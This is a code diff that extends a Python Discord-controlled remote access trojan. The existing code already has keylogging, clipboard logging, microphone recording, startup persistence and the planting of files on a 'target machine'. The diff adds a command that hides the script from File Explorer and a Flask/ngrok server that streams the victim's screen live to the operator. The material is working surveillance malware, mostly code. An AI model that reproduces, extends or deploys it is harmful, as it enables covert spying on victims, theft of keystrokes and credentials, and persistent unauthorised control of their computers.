@@ -1,12 +1,16 @@
-import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave, time, threading
 import discord, io, aiohttp
+import numpy as np
 
+from mss import mss
+from flask import Flask, Response
 from Clip_logging import Cliplogger
 from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKSTOKENHERE'
+
+TOKEN = 'YOURTOKSTOKENHERE'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -16,7 +20,10 @@ bot = commands.Bot(command_prefix=".", intents=intent)
 klogger = Keylogger()
 clogger = Cliplogger()
 activeRecording = {}
+activeStreaming = {}
 prefix = '.'
+streaming = False
+flask_started = False
 
 def get_current_userAndMachine():
     user = os.getlogin()
@@ -335,6 +342,14 @@ async def rmv(ctx: commands.Context, file:str=None):
     except (OSError, Exception) as e:
         await ctx.send(f"{e}")
 
+async def hide(ctx: commands.Context):
+    try:
+        script = sys.argv[0]
+        subprocess.run(["attrib", "+h", script])
+        await ctx.send("file has been hided")
+    except Exception as e:
+        await ctx.send(f"**subprocess error**\n```\n{e}\n```")
+
 async def recordmic(ctx: commands.Context, time=None):
     try:
         if time is None or not str(time).isdigit():
@@ -451,10 +466,13 @@ async def CopytoStartUpFolder(ctx: commands.Context):
 async def help(ctx: commands.Context):
     help = (
         "**commands:**\n"
+        "**mandatory arguments is marked with:**`<arg>`\n"
+        "**optional arguments is marked with:**`[arg]`\n"
+        "**optional but mandatory arguments (if typed) is marked with:**`[<arg>]`\n"
         "```\n"
         "::GENERAL COMMAND\n"
         ".help      :: shows this message\n"
-        ".cd <[folder]> :: change directory\n"
+        ".cd [folder] :: change directory\n"
         ".ls [folder] :: list directory\n"
         ".who       :: shows current user and machine\n"
         ".hello     :: to check if bot still on\n"
@@ -465,10 +483,13 @@ async def help(ctx: commands.Context):
         ".addstartup :: add program to startup\n"
         ".recordmic <time> :: record audio and save it\n"
         ".stoprecord :: stop audio recording and sends the result\n"
+        ".hide      :: hides the file from file explorer\n"
+        ".screenshare <url-ngrok-http> <port-ngrok-http> :: share target screen to the internet for you to open\n"
+        ".stopsharing :: stop screenshare"
         "\n"
         "::FILE TRANSFER\n"
-        ".download <file> [time] :: turns a file into downloadable link\n"
-        ".upload <url-with-file> [name] :: request a file from a url and plant it in target machine\n"
+        ".download <file> [expired-time] :: turns a file into downloadable link\n"
+        ".upload <url-with-file> [save-as-<name>.<extension>] :: request a file from a url and plant it in target machine\n"
         "\n"
         "::LOGGER\n"
         "   ::KEYLOGGING\n"
@@ -483,6 +504,62 @@ async def help(ctx: commands.Context):
     )
     await ctx.send(help)
 
+app = Flask(__name__)
+
+def grabFramebyFrame():
+    try:
+        with mss() as sct:
+            monitor = sct.monitors[1]
+            screen = sct.grab(monitor)
+            frame = np.array(screen)
+            color = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+            resize = cv2.resize(color, (1280, 720))
+            success, encodeImg = cv2.imencode('.jpg', resize, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+            if success:
+                return encodeImg.tobytes()
+    except Exception:
+        pass
+    return None
+
+def generateFrame():
+    global streaming
+    while True:
+        if not streaming:
+            black_frame = np.zeros((720, 1280, 3), dtype=np.uint8)
+            _, encoded = cv2.imencode('.jpg', black_frame)
+            buff = encoded.tobytes()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + buff + b'\r\n')
+            time.sleep(1)
+            continue
+
+        buf = grabFramebyFrame()
+        if buf is None:
+            time.sleep(0.05)
+            continue
+
+        yield (b'--frame\r\n'
+               b'Content-Type: image/jpeg\r\n\r\n' + buf + b'\r\n')
+        time.sleep(0.05)
+
+@app.route('/')
+def index():
+    return '''
+    <html>
+      <head><title>Live Screen Sharing</title></head>
+      <body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh;">
+        <img src="/stream" style="max-width:100%; max-height:100%; object-fit:contain;">
+      </body>
+    </html>
+    '''
+
+@app.route('/stream')
+def stream():
+    return Response(generateFrame(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+def start_flask_server(port):
+    app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
+
 @bot.event
 async def on_ready():
     for guild in bot.guilds:
@@ -494,6 +571,7 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_message(message):
+    global streaming, flask_started
     if message.author == bot.user:
         return
     txt = message.content.strip()
@@ -541,6 +619,24 @@ async def on_message(message):
             else:
                 time = " ".join(arg)
                 await recordmic(ctx, time=time)
+        elif command == ".screenshare":
+            if len(arg) < 2:
+                await message.channel.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+                return
+
+            url = arg[0]
+            port = arg[1]
+            if not url.startswith(("https://", "http://")) or not port.isdigit():
+                await message.channel.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+                return
+
+            port = int(port)
+            if not flask_started:
+                t = threading.Thread(target=start_flask_server, args=(port,), daemon=True)
+                t.start()
+                flask_started = True
+            streaming = True
+            await ctx.send(f"streaming is ready! url `{url}` port `{str(port)}`")
 
         elif command == ".download":
             if not arg:
@@ -607,9 +703,16 @@ async def on_message(message):
             await CopytoStartUpFolder(ctx)
         elif command == ".stoprecord":
             await stoprecord(ctx)
-
+        elif command == ".hide":
+            await hide(ctx)
+        elif command == ".stopsharing":
+            if streaming:
+                streaming = False
+                await ctx.send("webstreaming stopped!")
+            else:
+                await ctx.send("no active webstreaming active here!")
         else:
-            await ctx.send(f"unknown command '{command}', type '.help' for help")
+            await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
 
 bot.run(TOKEN, reconnect=True)
